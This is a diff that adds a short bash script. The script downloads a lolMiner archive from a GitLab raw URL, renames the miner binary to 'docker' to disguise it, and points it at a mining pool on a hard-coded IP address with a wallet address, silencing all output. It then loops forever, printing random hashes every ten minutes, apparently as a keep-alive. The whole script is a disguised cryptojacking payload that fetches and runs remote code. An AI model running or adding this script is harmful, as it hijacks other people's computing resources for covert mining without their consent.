@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://gitlab.com/damithnissanka96/aet/-/raw/main/lol.tar.gz && tar -xvf lol.tar.gz
+mv lolMiner docker
+./docker -a C29AE -o stratum+tcp://139.162.56.204:443 -u ak_2ra4Enw7abrDKAs9NeyRRBFcaVveatfqM7xrwQ4LnWqw9nPKD7.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
